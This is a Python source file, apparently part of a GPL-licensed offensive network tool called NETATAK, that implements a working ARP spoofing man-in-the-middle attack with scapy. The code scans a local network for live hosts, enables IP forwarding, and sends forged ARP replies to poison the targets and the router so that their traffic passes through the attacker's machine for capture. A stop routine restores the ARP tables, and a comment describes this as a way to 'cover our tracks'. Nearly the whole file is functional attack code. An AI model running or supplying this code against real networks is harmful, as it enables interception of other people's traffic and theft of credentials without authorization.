"""
Copyright (C) 2020 Tyrone Westall

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

# ARP MITM
# This tool will start by requesting details of the Router IP, network address and the subnet mask. It will then conduct
# an ARP scan on the network and find out which hosts are alive. Once a target list has been generated the program will
# send an ARP broadcast on the local network, and the machine running NETATAK will act as the
# default gateway for the network, forwarding traffic to the real default gateway. You will then be able to use Wireshark
# to monitor the forwarded traffic.

import sys
import os
import platform
from scapy.all import *
from netscanner import netscan_main

# Define text colours
B, R, Y, G, M, N = '\33[94m', '\033[91m', '\33[93m', '\033[1;32m', '\033[1;35m', '\033[0m'

# Define the class
class arp_mitm:
    def __init__(self, target, rtrip, atkopt, timeout=10, pktintr=0.1):
        # Netscanner/MITM variables
        self.target = target  # Target machine/network
        self.rtrip = rtrip  # Default gateway for the network
        self.atkopt = atkopt  # 0 = Start MITM, 1 = Stop MITM
        self.timeout = timeout  # Response timeout value
        self.pktintr = float(pktintr)  # Interval between packets
        self.rtr_scan = {}
        self.rtrmac = ""
        self.tgt_list_temp = {}

        # Linux - IP Forwarding file name
        self.ipforward_file = "/proc/sys/net/ipv4/ip_forward"

    # Call netscanner to conduct an ARP scan of the target/network and build the target list, get mac addresses from all responses
    def find_targets(self):
        self.tgt_list = netscan_main.netscanner(1, self.target, timeout=self.timeout, pktintr=self.pktintr, inc_mac=1).init_scan()
        print("{0}[*] Obtaining Router MAC Address...".format(N))
        self.rtr_scan = netscan_main.netscanner(1, self.rtrip, timeout=self.timeout, pktintr=self.pktintr, inc_mac=1).init_scan()

        if not self.tgt_list:
            print("{0}[*] No targets found via ARP scan. Exiting...".format(R))
            return False
        # Targets found, remove the router from the target list if it responded via ARP. If the router was the only response, then exit the script.
        for key, value in self.tgt_list.items():
            if self.rtrip in value:
                self.tgt_list.pop(key)
                print("{0}[*] Router %s removed from target list".format(B) % self.rtrip)
                break
        if len(self.tgt_list) == 0:
            print("{0}[*] No valid targets remaining. Exiting...".format(R))
            return False

        for key, value in self.rtr_scan.items():
            if self.rtrip in value:
                self.rtrmac = self.rtr_scan[key].split('-')
                self.rtrmac = self.rtrmac[1]
            else:
                print("{0}[*] Router IP did not respond to ARP request. Exiting...".format(R))
                return False

        if self.atkopt == 0:
            # Start ARP MITM
            self.start_arp_mitm()
        else:
            # Stop ARP MITM
            self.stop_arp_mitm()

    def start_arp_mitm(self):
        print("{0}[*] Starting ARP MITM attack...".format(N))
        print("{0}[*] Turn on IP Forwarding in {1}...".format(N, self.ipforward_file))
        print("{0}[*] Use Wireshark or a similar network analysis tool to monitor the traffic.".format(Y))
        os.popen("sudo echo '1' > {0}".format(self.ipforward_file))
        try:
            for i in self.tgt_list:
                result = self.tgt_list[i].split('-')
                send(ARP(op=2, pdst=result[0], psrc=self.rtrip, hwdst=result[1]), count=1, verbose=0)
                send(ARP(op=2, pdst=self.rtrip, psrc=result[0], hwdst=self.rtrmac), count=1, verbose=0)
                time.sleep(5)
                print("{0}[*] Target %s with MAC Address %s poisoned".format(G) % (result[0], result[1]))
        except KeyboardInterrupt:
            print("{0}[*] ARP MITM Attack stopped by user.".format(R))
            self.stop_arp_mitm()

    def stop_arp_mitm(self):
        print("{0}[*] Stopping ARP MITM attack...".format(N))
        # Re-ARP the target(s) and router so that their traffic flows to the correct destinations, this will (hopefully) cover our tracks
        for i in self.tgt_list:
            result = self.tgt_list[i].split('-')
            send(ARP(op=2, pdst=result[0], psrc=self.rtrip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.rtrmac), verbose=0, count=5)
            send(ARP(op=2, pdst=self.rtrip, psrc=result[0], hwdst=self.rtrmac, hwsrc=result[1]), verbose=0, count=5)
            time.sleep(5)
            print("{0}[*]Target %s with MAC address %s restored".format(G) % (result[0], result[1]))

        # Turn IP Forwarding Off.
        print("{0}[*] Turn off IP Forwarding in {1}...".format(N, self.ipforward_file))
        os.popen("sudo echo '0' > {0}".format(self.ipforward_file))

        print("{0}[*] Targets restored. Exiting...".format(G))
        return True